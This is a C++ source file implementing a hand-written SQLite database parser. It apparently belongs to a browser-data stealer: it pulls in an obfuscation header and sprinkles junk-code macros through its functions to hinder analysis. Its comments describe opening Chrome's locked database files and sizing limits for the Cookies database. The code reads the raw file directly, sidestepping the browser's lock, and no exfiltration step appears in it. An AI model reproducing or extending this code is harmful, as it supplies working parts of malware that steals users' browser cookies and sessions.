#ifndef NOMINMAX
#define NOMINMAX
#endif
#ifdef min
#undef min
#endif
#ifdef max
#undef max
#endif
#include "SQLiteHandler.h"
#include "../core/Obfuscation.h"
#include <algorithm>
#include <sstream>
#include <cstring>


namespace SQLite {

    SQLiteHandler::SQLiteHandler(std::string dbPath) : _dbPath(dbPath), _fileSize(0) {
        JUNK_CODE_SMALL
        // FILE_SHARE_DELETE needed: Chrome locks its DB but allows delete-sharing
        HANDLE hFile = CreateFileA(
            dbPath.c_str(), GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return;
        LARGE_INTEGER liSize = {};
        if (!GetFileSizeEx(hFile, &liSize) || liSize.QuadPart == 0) {
            CloseHandle(hFile); return;
        }
        if (liSize.QuadPart > 64 * 1024 * 1024) {
            // Safety cap: skip DB > 64 MB (Cookies on fresh profile is ~1 MB)
            CloseHandle(hFile); return;
        }
        _fileSize = (size_t)liSize.QuadPart;
        _fileBytes.resize(_fileSize);
        DWORD dwRead = 0;
        if (!ReadFile(hFile, _fileBytes.data(), (DWORD)_fileSize, &dwRead, NULL) || dwRead != _fileSize) {
            _fileBytes.clear(); _fileSize = 0;
        }
        CloseHandle(hFile);
    }

    // ── Public: find table and parse its rows ───────────────────────
    bool SQLiteHandler::ReadTable(std::string tableName) {
        JUNK_CODE_LARGE
        if (_fileBytes.size() < 100) return false;
        _tableEntries.clear();
        _fieldNames.clear();

        // Read page size from header (bytes 16-17)
        uint16_t pageSize = ((uint16_t)_fileBytes[16] << 8) | _fileBytes[17];
        if (pageSize == 1) pageSize = 65536;  // spec: 0x0001 means 65536

        // Step 1: parse sqlite_master (page 1) to find table's root page
        ParsePage(1, pageSize, true);

        int targetRootPage = -1;
        std::string sql;
        for (const auto& entry : _tableEntries) {
            auto itName = entry.find("name");
            if (itName == entry.end() || itName->second != tableName) continue;
            auto itRoot = entry.find("rootpage");
            auto itSql  = entry.find("sql");
            if (itRoot == entry.end()) continue;
            try { targetRootPage = std::stoi(itRoot->second); } catch (...) { continue; }
            if (itSql != entry.end()) sql = itSql->second;
            break;
        }
        if (targetRootPage < 1) return false;

        // Step 2: parse column names from CREATE TABLE SQL
        _tableEntries.clear();
        _fieldNames.clear();
        ParseFieldsFromSql(sql);

        // Step 3: parse the actual table B-tree
        ParsePage(targetRootPage, pageSize, false);
        return !_tableEntries.empty();
    }

    // ── ParseFieldsFromSql: extract column names from CREATE TABLE ──
    // FIX Bug 3: only stop on standalone constraint keywords at the
    // start of a segment, not inside column/type names.
    void SQLiteHandler::ParseFieldsFromSql(std::string sql) {
        JUNK_CODE_SMALL
        size_t start = sql.find('(');
        size_t end   = sql.rfind(')');
        if (start == std::string::npos || end == std::string::npos || end <= start) return;

        std::string fieldsPart = sql.substr(start + 1, end - start - 1);

        // Tokenise by comma, respecting nested parens
        std::vector<std::string> segments;
        int depth = 0;
        std::string cur;
        for (char c : fieldsPart) {
            if (c == '(') { ++depth; cur += c; }
            else if (c == ')') { --depth; cur += c; }
            else if (c == ',' && depth == 0) {
                segments.push_back(cur); cur.clear();
            } else {
                cur += c;
            }
        }
        if (!cur.empty()) segments.push_back(cur);

        for (auto& seg : segments) {
            // Trim
            size_t f = seg.find_first_not_of(" \t\r\n");
            if (f == std::string::npos) continue;
            seg = seg.substr(f);
            size_t l = seg.find_last_not_of(" \t\r\n");
            if (l != std::string::npos) seg = seg.substr(0, l + 1);
            if (seg.empty()) continue;

            // Build uppercase first-token for constraint detection
            std::string upper;
            size_t sp = seg.find_first_of(" \t(");
            std::string firstToken = (sp != std::string::npos) ? seg.substr(0, sp) : seg;
            upper = firstToken;
            std::transform(upper.begin(), upper.end(), upper.begin(), ::toupper);

            // FIX: skip only when the ENTIRE first token is a table constraint keyword
            if (upper == "PRIMARY" || upper == "UNIQUE" || upper == "CHECK" ||
                upper == "FOREIGN" || upper == "CONSTRAINT") continue;

            // Extract column name: may be quoted with ` " [ or unquoted
            std::string name;
            if (!seg.empty() && (seg[0] == '`' || seg[0] == '"' || seg[0] == '[')) {
                char close = (seg[0] == '[') ? ']' : seg[0];
                size_t closing = seg.find(close, 1);
                name = (closing != std::string::npos) ? seg.substr(1, closing - 1) : seg.substr(1);
            } else {
                size_t space = seg.find_first_of(" \t");
                name = (space != std::string::npos) ? seg.substr(0, space) : seg;
            }
            if (!name.empty()) _fieldNames.push_back(name);
        }
    }

    // ── ParsePage: recursive B-tree traversal ───────────────────────
    // FIX Bug 1 & 5: correctly traverse interior pages (type 0x05/0x02)
    // and protect against infinite recursion with depth limit.
    void SQLiteHandler::ParsePage(int pageNum, uint16_t pageSize, bool isMaster, int depth) {
        if (pageNum < 1 || depth > 32) return;  // depth guard

        size_t pageOffset = (size_t)(pageNum - 1) * pageSize;
        if (pageOffset + pageSize > _fileBytes.size()) return;

        // Page 1 has 100-byte file header before page header
        size_t hdrOffset = pageOffset + (pageNum == 1 ? 100 : 0);
        if (hdrOffset + 12 >= _fileBytes.size()) return;

        uint8_t  pageType  = _fileBytes[hdrOffset];
        uint16_t cellCount = ((uint16_t)_fileBytes[hdrOffset + 3] << 8) | _fileBytes[hdrOffset + 4];

        bool isLeaf     = (pageType == 0x0D || pageType == 0x0A);
        bool isInterior = (pageType == 0x05 || pageType == 0x02);

        if (!isLeaf && !isInterior) return;

        // Cell pointer array offset:
        //   leaf:     hdrOffset + 8
        //   interior: hdrOffset + 12  (4 extra bytes for right-most pointer)
        size_t ptrArray = hdrOffset + (isInterior ? 12 : 8);
        if (ptrArray + (size_t)cellCount * 2 > _fileBytes.size()) return;

        if (isInterior) {
            // FIX Bug 1: read right-most child from header bytes 8-11
            uint32_t rightMost =
                ((uint32_t)_fileBytes[hdrOffset + 8]  << 24) |
                ((uint32_t)_fileBytes[hdrOffset + 9]  << 16) |
                ((uint32_t)_fileBytes[hdrOffset + 10] <<  8) |
                 (uint32_t)_fileBytes[hdrOffset + 11];

            // Visit each left-child (stored in first 4 bytes of each cell)
            for (int i = 0; i < cellCount; ++i) {
                uint16_t cellOff = ((uint16_t)_fileBytes[ptrArray + i*2] << 8) |
                                               _fileBytes[ptrArray + i*2 + 1];
                size_t cellAbs = pageOffset + cellOff;
                if (cellAbs + 4 > _fileBytes.size()) continue;
                uint32_t leftChild =
                    ((uint32_t)_fileBytes[cellAbs]   << 24) |
                    ((uint32_t)_fileBytes[cellAbs+1] << 16) |
                    ((uint32_t)_fileBytes[cellAbs+2] <<  8) |
                     (uint32_t)_fileBytes[cellAbs+3];
                ParsePage(leftChild, pageSize, isMaster, depth + 1);
            }
            // Visit right-most child last
            ParsePage(rightMost, pageSize, isMaster, depth + 1);
        } else {
            // Leaf: parse each cell
            for (int i = 0; i < cellCount; ++i) {
                if (ptrArray + (size_t)i*2 + 1 >= _fileBytes.size()) break;
                uint16_t cellOff = ((uint16_t)_fileBytes[ptrArray + i*2] << 8) |
                                               _fileBytes[ptrArray + i*2 + 1];
                if (cellOff == 0) continue;
                ParseCell(pageOffset + cellOff, pageSize, pageOffset, isMaster);
            }
        }
    }

    // ── ReadVarint: decode SQLite variable-length integer ────────────
    int SQLiteHandler::ReadVarint(size_t offset, uint64_t& value) {
        value = 0;
        for (int i = 0; i < 9; ++i) {
            if (offset + i >= _fileBytes.size()) return 0;
            uint8_t b = _fileBytes[offset + i];
            if (i < 8) {
                value = (value << 7) | (b & 0x7F);
                if (!(b & 0x80)) return i + 1;
            } else {
                value = (value << 8) | b;
                return 9;
            }
        }
        return 0;
    }

    // ── ParseCell: decode one B-tree leaf cell ───────────────────────
    // FIX Bug 2: handle overflow pages (payload > usable_size)
    // FIX Bug 4: handle serial types 5, 6 (6-byte, 8-byte integers)
    void SQLiteHandler::ParseCell(size_t offset, uint16_t pageSize,
                                   size_t pageBase, bool isMaster) {
        if (offset + 4 >= _fileBytes.size()) return;

        // 1) Payload size varint
        uint64_t payloadSize = 0;
        int len = ReadVarint(offset, payloadSize);
        if (len == 0 || payloadSize == 0) return;
        offset += len;

        // 2) Row ID varint
        uint64_t rowId = 0;
        len = ReadVarint(offset, rowId);
        if (len == 0) return;
        offset += len;

        // 3) Inline payload — SQLite stores max usable_size bytes inline
        //    usable_size = pageSize - reserved_space (byte 20 of file header)
        uint8_t reserved = _fileBytes[20];
        size_t usable = (size_t)pageSize - reserved;
        // Max inline for leaf table: U-((U-12)*32/255)-23  (spec formula)
        size_t X = usable - 35;
        size_t M = ((usable - 12) * 32 / 255) - 23;
        size_t K = M + ((payloadSize - M) % (usable - 4));

        size_t inlineLen = (size_t)payloadSize;
        if (payloadSize > X) {
            inlineLen = (K <= X) ? K : M;
        }
        inlineLen = std::min(inlineLen, _fileBytes.size() - offset);

        // Assemble full payload — copy inline portion first
        std::vector<uint8_t> payload;
        payload.reserve((size_t)payloadSize);
        payload.insert(payload.end(),
                       _fileBytes.begin() + offset,
                       _fileBytes.begin() + offset + inlineLen);

        // FIX Bug 2: follow overflow chain if payload is split
        if (payload.size() < (size_t)payloadSize) {
            size_t overflowPtrOff = offset + inlineLen;
            while (payload.size() < (size_t)payloadSize &&
                   overflowPtrOff + 4 <= _fileBytes.size()) {
                uint32_t ovPage =
                    ((uint32_t)_fileBytes[overflowPtrOff]   << 24) |
                    ((uint32_t)_fileBytes[overflowPtrOff+1] << 16) |
                    ((uint32_t)_fileBytes[overflowPtrOff+2] <<  8) |
                     (uint32_t)_fileBytes[overflowPtrOff+3];
                if (ovPage == 0) break;

                size_t ovOff = (size_t)(ovPage - 1) * pageSize;
                if (ovOff + 4 >= _fileBytes.size()) break;

                // First 4 bytes of overflow page = next overflow page number
                uint32_t nextOvPage =
                    ((uint32_t)_fileBytes[ovOff]   << 24) |
                    ((uint32_t)_fileBytes[ovOff+1] << 16) |
                    ((uint32_t)_fileBytes[ovOff+2] <<  8) |
                     (uint32_t)_fileBytes[ovOff+3];

                size_t remain = (size_t)payloadSize - payload.size();
                size_t avail  = std::min(remain, (size_t)pageSize - 4);
                size_t dataStart = ovOff + 4;
                avail = std::min(avail, _fileBytes.size() - dataStart);
                if (avail == 0) break;

                payload.insert(payload.end(),
                                _fileBytes.begin() + dataStart,
                                _fileBytes.begin() + dataStart + avail);
                overflowPtrOff = ovOff;   // next overflow pointer is at ovOff
                if (nextOvPage == 0) break;
                // Prepare to read from nextOvPage
                overflowPtrOff = (size_t)(nextOvPage - 1) * pageSize;
                if (overflowPtrOff + 4 > _fileBytes.size()) break;
            }
        }

        if (payload.empty()) return;

        // 4) Parse record header (serial types)
        size_t hdrStart = 0;
        uint64_t headerSize = 0;
        int hLen = ReadVarint2(payload, hdrStart, headerSize);
        if (hLen == 0) return;

        size_t currentHeader = hdrStart + hLen;
        size_t headerEnd     = hdrStart + (size_t)headerSize;
        size_t dataOff       = headerEnd;

        std::vector<uint64_t> serialTypes;
        serialTypes.reserve(16);
        while (currentHeader < headerEnd && currentHeader < payload.size()) {
            uint64_t type = 0;
            int n = ReadVarint2(payload, currentHeader, type);
            if (n == 0) break;
            currentHeader += n;
            serialTypes.push_back(type);
        }

        // 5) Decode each field
        static const std::string masterFields[] =
            {"type", "name", "tbl_name", "rootpage", "sql"};

        std::map<std::string, std::string> entry;

        for (size_t fi = 0; fi < serialTypes.size(); ++fi) {
            uint64_t type = serialTypes[fi];
            std::string value;
            size_t fieldLen = 0;

            if (type == 0) {
                // NULL — no bytes
            } else if (type == 1) {
                if (dataOff < payload.size()) {
                    value = std::to_string((int8_t)payload[dataOff]);
                    fieldLen = 1;
                }
            } else if (type == 2) {
                if (dataOff + 2 <= payload.size()) {
                    int16_t v = (int16_t)(((uint16_t)payload[dataOff] << 8) | payload[dataOff+1]);
                    value = std::to_string(v); fieldLen = 2;
                }
            } else if (type == 3) {
                if (dataOff + 3 <= payload.size()) {
                    int32_t v = ((int32_t)(int8_t)payload[dataOff] << 16) |
                                ((int32_t)payload[dataOff+1] << 8)        |
                                 (int32_t)payload[dataOff+2];
                    value = std::to_string(v); fieldLen = 3;
                }
            } else if (type == 4) {
                if (dataOff + 4 <= payload.size()) {
                    int32_t v = ((int32_t)payload[dataOff]   << 24) |
                                ((int32_t)payload[dataOff+1] << 16) |
                                ((int32_t)payload[dataOff+2] <<  8) |
                                 (int32_t)payload[dataOff+3];
                    value = std::to_string(v); fieldLen = 4;
                }
            // FIX Bug 4: handle type 5 (6-byte) and type 6 (8-byte) integers
            } else if (type == 5) {
                if (dataOff + 6 <= payload.size()) {
                    int64_t v = 0;
                    for (int b = 0; b < 6; ++b) v = (v << 8) | payload[dataOff + b];
                    // sign-extend from 48 bits
                    if (v & (1LL << 47)) v |= ~((1LL << 48) - 1);
                    value = std::to_string(v); fieldLen = 6;
                }
            } else if (type == 6) {
                if (dataOff + 8 <= payload.size()) {
                    int64_t v = 0;
                    for (int b = 0; b < 8; ++b) v = (v << 8) | payload[dataOff + b];
                    value = std::to_string(v); fieldLen = 8;
                }
            } else if (type == 7) {
                // IEEE 754 double
                if (dataOff + 8 <= payload.size()) {
                    double d;
                    uint64_t bits = 0;
                    for (int b = 0; b < 8; ++b) bits = (bits << 8) | payload[dataOff + b];
                    memcpy(&d, &bits, 8);
                    char buf[32]; snprintf(buf, sizeof(buf), "%g", d);
                    value = buf; fieldLen = 8;
                }
            } else if (type == 8) { value = "0"; }
            else if (type == 9) { value = "1"; }
            else if (type >= 12 && (type % 2 == 0)) {
                // BLOB
                fieldLen = (size_t)(type - 12) / 2;
                if (dataOff + fieldLen <= payload.size())
                    value.assign((char*)&payload[dataOff], fieldLen);
            } else if (type >= 13 && (type % 2 != 0)) {
                // TEXT
                fieldLen = (size_t)(type - 13) / 2;
                if (dataOff + fieldLen <= payload.size())
                    value.assign((char*)&payload[dataOff], fieldLen);
            }

            dataOff += fieldLen;

            // Determine field name
            std::string fieldName;
            if (isMaster) {
                fieldName = (fi < 5) ? masterFields[fi] : ("field_" + std::to_string(fi));
            } else {
                fieldName = (fi < _fieldNames.size()) ? _fieldNames[fi] : ("field_" + std::to_string(fi));
            }
            entry[fieldName] = value;
        }

        _tableEntries.push_back(std::move(entry));
    }

    // ── ReadVarint2: varint decoder operating on vector<uint8_t> ────
    int SQLiteHandler::ReadVarint2(const std::vector<uint8_t>& buf, size_t offset, uint64_t& value) {
        value = 0;
        for (int i = 0; i < 9; ++i) {
            if (offset + i >= buf.size()) return 0;
            uint8_t b = buf[offset + i];
            if (i < 8) {
                value = (value << 7) | (b & 0x7F);
                if (!(b & 0x80)) return i + 1;
            } else {
                value = (value << 8) | b;
                return 9;
            }
        }
        return 0;
    }
}
